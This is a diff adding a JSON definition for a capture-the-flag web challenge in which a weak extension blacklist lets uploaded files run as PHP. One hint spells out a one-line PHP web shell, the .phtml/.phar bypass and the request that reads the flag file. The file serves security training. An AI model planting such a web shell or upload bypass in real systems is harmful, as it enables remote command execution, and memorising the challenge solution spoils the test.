@@ -1,0 +1,24 @@
+{
+  "title": "Upload to RCE — Weak Extension Blacklist",
+  "slug": "file-upload-rce",
+  "description": "PicProfile blocks .php uploads but Apache treats other extensions as PHP too. Upload a shell, execute it, read /flag.txt.",
+  "category": "Web Exploitation",
+  "team": "red",
+  "difficulty": 2,
+  "points": 350,
+  "flag": "CTF{REDACTED}",
+  "hints": [
+    {
+      "text": "Blacklist rejects .php / .php5 / .php7 / .pht. The Apache config in this container handles two other extensions as PHP.",
+      "cost": 25
+    },
+    {
+      "text": "Try .phtml or .phar. Upload `<?php system($_GET['c']); ?>` as shell.phtml, then hit /uploads/shell.phtml?c=cat%20/flag.txt.",
+      "cost": 75
+    }
+  ],
+  "skills": ["File Upload", "RCE", "Apache", "PHP", "Filter Bypass"],
+  "mitre_techniques": ["T1190", "T1505.003"],
+  "docker_image": "siege/file-upload-rce:latest",
+  "docker_port": 80
+}
